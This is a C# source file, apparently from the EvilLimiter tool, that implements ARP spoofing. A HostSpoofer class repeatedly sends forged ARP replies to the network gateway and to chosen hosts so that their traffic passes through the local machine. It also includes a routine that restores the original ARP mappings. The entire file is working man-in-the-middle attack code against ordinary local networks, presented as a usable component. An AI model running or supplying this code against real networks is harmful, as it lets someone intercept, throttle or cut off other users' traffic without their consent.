using EvilLimiter.Windows.Common;
using EvilLimiter.Windows.Data;
using EvilLimiter.Windows.Extensions;
using EvilLimiter.Windows.Utilities;
using PcapDotNet.Base;
using PcapDotNet.Core;
using PcapDotNet.Core.Extensions;
using PcapDotNet.Packets;
using PcapDotNet.Packets.Arp;
using PcapDotNet.Packets.Ethernet;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace EvilLimiter.Windows.Networking
{
    public class HostSpoofer
    {
        public bool IsSpoofing { get; private set; }


        private readonly NetworkInformation _networkInfo;
        private readonly List<Host> _spoofedHosts;
        private readonly object _spoofedHostsLock;

        private CancellationTokenSource _tokenSource;



        public HostSpoofer(NetworkInformation netInfo)
        {
            this._networkInfo = netInfo;
            this._spoofedHosts = new List<Host>();
            this._spoofedHostsLock = new object();
        }



        public void Start()
        {
            if (IsSpoofing)
                return;

            _tokenSource = new CancellationTokenSource();
            var token = _tokenSource.Token;

            Task.Run(() => SpoofLoop(token), token);
            IsSpoofing = true;
        }


        public void Stop()
        {
            if (!IsSpoofing)
                return;

            _tokenSource.Cancel();

            lock (_spoofedHostsLock)
            {
                foreach (var host in _spoofedHosts)
                    Restore(host);
            }

            IsSpoofing = false;
        }


        public void Add(Host host)
        {
            lock (_spoofedHostsLock)
                if (!_spoofedHosts.Contains(host))
                    _spoofedHosts.Add(host);
        }


        public void Remove(Host host)
        {
            bool contained = false;

            lock (_spoofedHostsLock)
            {
                if (_spoofedHosts.Contains(host))
                {
                    _spoofedHosts.Remove(host);
                    contained = true;
                }
            }

            if (contained)
                Restore(host);
        }


        private void SpoofLoop(CancellationToken token)
        {
            var sourcePhysicalAddress = _networkInfo.Interface.GetNetworkInterface().GetPhysicalAddress();

            while (!token.IsCancellationRequested)
            {
                List<Host> hosts;
                lock (_spoofedHostsLock)
                    hosts = new List<Host>(_spoofedHosts);

                foreach (var host in hosts)
                {
                    var gatewayPacket = PacketBuilder.Build(
                        DateTime.Now,
                        new EthernetLayer()
                        {
                            EtherType = EthernetType.None,
                            Source = NetworkUtilities.PhysicalAddressToMacAddress(sourcePhysicalAddress),
                            Destination = _networkInfo.GatewayMac,
                        },
                        new ArpLayer()
                        {
                            ProtocolType = EthernetType.IpV4,
                            Operation = ArpOperation.Reply,
                            SenderProtocolAddress = host.IpAddress.ToBytes(),
                            SenderHardwareAddress = sourcePhysicalAddress.GetAddressBytes().AsReadOnly(),
                            TargetProtocolAddress = _networkInfo.GatewayIp.ToBytes(),
                            TargetHardwareAddress = _networkInfo.GatewayMac.ToBytes(),
                        }
                    );

                    var targetPacket = PacketBuilder.Build(
                        DateTime.Now,
                        new EthernetLayer()
                        {
                            EtherType = EthernetType.None,
                            Source = NetworkUtilities.PhysicalAddressToMacAddress(sourcePhysicalAddress),
                            Destination = host.MacAddress,
                        },
                        new ArpLayer()
                        {
                            ProtocolType = EthernetType.IpV4,
                            Operation = ArpOperation.Reply,
                            SenderProtocolAddress = _networkInfo.GatewayIp.ToBytes(),
                            SenderHardwareAddress = sourcePhysicalAddress.GetAddressBytes().AsReadOnly(),
                            TargetProtocolAddress = host.IpAddress.ToBytes(),
                            TargetHardwareAddress = host.MacAddress.ToBytes(),
                        }
                    );

                    _networkInfo.Communicator.SendPacket(gatewayPacket);
                    _networkInfo.Communicator.SendPacket(targetPacket);
                }

                Thread.Sleep(Config.SpoofSendInterval);
            }
        }


        private void Restore(Host host)
        {
            var sourcePhysicalAddress = _networkInfo.Interface.GetNetworkInterface().GetPhysicalAddress();

            var gatewayPacket = PacketBuilder.Build(
                DateTime.Now,
                new EthernetLayer()
                {
                    EtherType = EthernetType.None,
                    Source = host.MacAddress,
                    Destination = _networkInfo.GatewayMac,
                },
                new ArpLayer()
                {
                    ProtocolType = EthernetType.IpV4,
                    Operation = ArpOperation.Reply,
                    SenderProtocolAddress = host.IpAddress.ToBytes(),
                    SenderHardwareAddress = host.MacAddress.ToBytes(),
                    TargetProtocolAddress = _networkInfo.GatewayIp.ToBytes(),
                    TargetHardwareAddress = NetworkUtilities.BroadcastMac.ToBytes(),
                }
            );

            var targetPacket = PacketBuilder.Build(
                DateTime.Now,
                new EthernetLayer()
                {
                    EtherType = EthernetType.None,
                    Source = _networkInfo.GatewayMac,
                    Destination = host.MacAddress,
                },
                new ArpLayer()
                {
                    ProtocolType = EthernetType.IpV4,
                    Operation = ArpOperation.Reply,
                    SenderProtocolAddress = _networkInfo.GatewayIp.ToBytes(),
                    SenderHardwareAddress = _networkInfo.GatewayMac.ToBytes(),
                    TargetProtocolAddress = host.IpAddress.ToBytes(),
                    TargetHardwareAddress = NetworkUtilities.BroadcastMac.ToBytes(),
                }
            );

            for (int i = 0; i < Config.SpoofRestoreSendCount; i++)
            {
                _networkInfo.Communicator.SendPacket(gatewayPacket);
                _networkInfo.Communicator.SendPacket(targetPacket);

                Thread.Sleep(Config.SpoofRestoreSendInterval);
            }
        }
    }
}
